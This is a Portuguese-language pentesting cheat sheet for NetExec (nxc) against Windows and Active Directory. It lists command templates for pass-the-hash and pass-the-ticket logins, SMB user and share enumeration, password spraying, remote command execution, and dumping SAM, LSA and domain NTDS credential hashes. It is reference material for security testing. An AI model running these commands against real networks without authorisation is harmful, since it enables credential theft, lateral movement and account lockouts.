O `nxc` (NetExec) é uma ferramenta de pentest voltada para ambientes [[Windows]]/[[8. Active Directory]], projetada para automatizar tarefas de enumeração, teste de credenciais, movimentação lateral e pós-exploração em larga escala.

> [!NOTE] Substituto do CrackMapExec
> O `nxc` é o fork ativo do CrackMapExec (`cme`), que foi descontinuado. Possui sintaxe idêntica e pode ser usado de forma intercambiável.

```shell
$ nxc <protocol> <target(s)> [options]
```

- `<protocol>`: protocolo alvo (`smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `ftp`)
- `<target(s)>`: IP, range CIDR (`192.168.1.0/24`) ou arquivo com lista de hosts

# Autenticação

As opções de autenticação são as mesmas para todos os protocolos:

```shell
$ nxc smb [target] -u [user] -p [password] # Usuário e senha
$ nxc smb [target] -u [user] -H [NT-hash]  # Hash NTLM (Pass-the-Hash)
$ nxc smb [target] -u [user] --use-kcache  # Ticket Kerberos (Pass-the-Ticket)
$ nxc smb [target] -u '' -p ''             # Null session
```

# Enumeração (SMB)

```shell
$ nxc smb [target] -u [user] -p [pass] --shares         # compartilhamentos
$ nxc smb [target] -u [user] -p [pass] --users          # usuários do domínio
$ nxc smb [target] -u [user] -p [pass] --groups         # grupos do domínio
$ nxc smb [target] -u [user] -p [pass] --sessions       # sessões ativas
$ nxc smb [target] -u [user] -p [pass] --loggedon-users # usuários logados localmente
```

# Password Spraying

Testa uma credencial contra múltiplos hosts ou usuários:

```shell
$ nxc smb [target] -u users.txt -p [password] --continue-on-success
$ nxc smb 192.168.1.0/24 -u [user] -p [password]
```

> [!warning] Risco de bloqueio de contas
> Testar muitos usuários com senha incorreta pode acionar políticas de bloqueio. Verifique a política antes com `--pass-pol`.

# Execução remota de comandos

Requer conta com privilégios administrativos no host alvo.

```shell
$ nxc smb [target] -u [user] -p [pass] -x "whoami"      # cmd (-x)
$ nxc smb [target] -u [user] -p [pass] -X "Get-Process" # PowerShell (-X)
```

# Dump de credenciais

```shell
$ nxc smb [target] -u [user] -p [pass] --sam # hashes locais (SAM)
$ nxc smb [target] -u [user] -p [pass] --lsa # LSA Secrets
$ nxc smb [dc-ip]  -u [user] -p [pass] --ntds # todos hashes do domínio (requer acesso ao DC)
```

# Módulos

```shell
$ nxc smb -L                                       # listar módulos disponíveis
$ nxc smb [target] -u [user] -p [pass] -M [module] # usar módulo
```
